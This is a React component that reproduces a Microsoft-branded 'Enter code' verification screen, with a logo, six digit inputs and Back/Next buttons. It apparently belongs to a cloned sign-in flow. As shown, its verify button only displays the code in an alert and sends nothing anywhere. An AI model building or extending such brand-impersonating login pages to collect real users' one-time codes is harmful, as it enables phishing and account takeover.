import { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import AuthLayout from "../components/AuthLayout.jsx";
import MicrosoftLogo from "../components/MicrosoftLogo.jsx";
import { useAuthFlow } from "../context/AuthFlowContext.jsx";

export default function CodePage() {
  const navigate = useNavigate();
  const { email } = useAuthFlow();

  const [code, setCode] = useState(Array(6).fill(""));
  const [codeError, setCodeError] = useState("");
  const inputsRef = useRef([]);

  useEffect(() => {
    if (!email) {
      navigate("/signin", { replace: true });
    }
  }, [email, navigate]);

  const handleCodeChange = (index, value) => {
    if (!/^[0-9]?$/.test(value)) return;
    const next = [...code];
    next[index] = value;
    setCode(next);
    setCodeError("");
    if (value && index < 5) {
      inputsRef.current[index + 1]?.focus();
    }
  };

  const handleCodeKeyDown = (index, e) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };

  const handleCodePaste = (e) => {
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!pasted) return;
    e.preventDefault();
    const next = Array(6).fill("");
    for (let i = 0; i < pasted.length; i++) next[i] = pasted[i];
    setCode(next);
    const lastIndex = Math.min(pasted.length, 6) - 1;
    inputsRef.current[lastIndex]?.focus();
  };

  const handleVerify = () => {
    if (code.some((d) => d === "")) {
      setCodeError("Enter the 6-digit code.");
      return;
    }
    alert(`Verifying code: ${code.join("")}`);
  };

  const handleBack = () => {
    navigate("/signin");
  };

  return (
    <AuthLayout>
      <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "28px" }}>
        <MicrosoftLogo />
        <span style={{ fontSize: "21px", color: "#5e5e5e", fontWeight: 600 }}>Microsoft</span>
      </div>

      <h1 style={{ fontSize: "24px", fontWeight: 600, margin: "0 0 12px", color: "#1b1b1b" }}>
        Enter code
      </h1>
      <p style={{ fontSize: "14.5px", color: "#1b1b1b", margin: "0 0 24px", lineHeight: 1.4 }}>
        We sent a code to {email || "your email"}. Enter it below to continue.
      </p>

      <div style={{ display: "flex", gap: "10px", marginBottom: "12px" }} onPaste={handleCodePaste}>
        {code.map((digit, i) => (
          <input
            key={i}
            ref={(el) => (inputsRef.current[i] = el)}
            type="text"
            inputMode="numeric"
            maxLength={1}
            value={digit}
            onChange={(e) => handleCodeChange(i, e.target.value)}
            onKeyDown={(e) => handleCodeKeyDown(i, e)}
            style={{
              width: "44px",
              height: "52px",
              textAlign: "center",
              fontSize: "22px",
              border: codeError ? "1px solid #d83b01" : "1px solid #666",
              outline: "none",
              color: "#1b1b1b",
              boxSizing: "border-box",
            }}
          />
        ))}
      </div>
      {codeError && (
        <div style={{ color: "#d83b01", fontSize: "13px", marginBottom: "8px" }}>{codeError}</div>
      )}

      <div style={{ marginBottom: "32px", marginTop: "16px" }}>
        <a href="#" style={{ color: "#0067b8", textDecoration: "none", fontSize: "14.5px" }}>
          Send a new code
        </a>
      </div>

      <div style={{ display: "flex", justifyContent: "flex-end", gap: "8px" }}>
        <button
          onClick={handleBack}
          style={{
            background: "#e0e0e0",
            border: "none",
            color: "#1b1b1b",
            fontSize: "15px",
            padding: "9px 28px",
            cursor: "pointer",
          }}
        >
          Back
        </button>
        <button
          onClick={handleVerify}
          style={{
            background: "#0067b8",
            border: "none",
            color: "#fff",
            fontSize: "15px",
            padding: "9px 28px",
            cursor: "pointer",
          }}
        >
          Next
        </button>
      </div>
    </AuthLayout>
  );
}
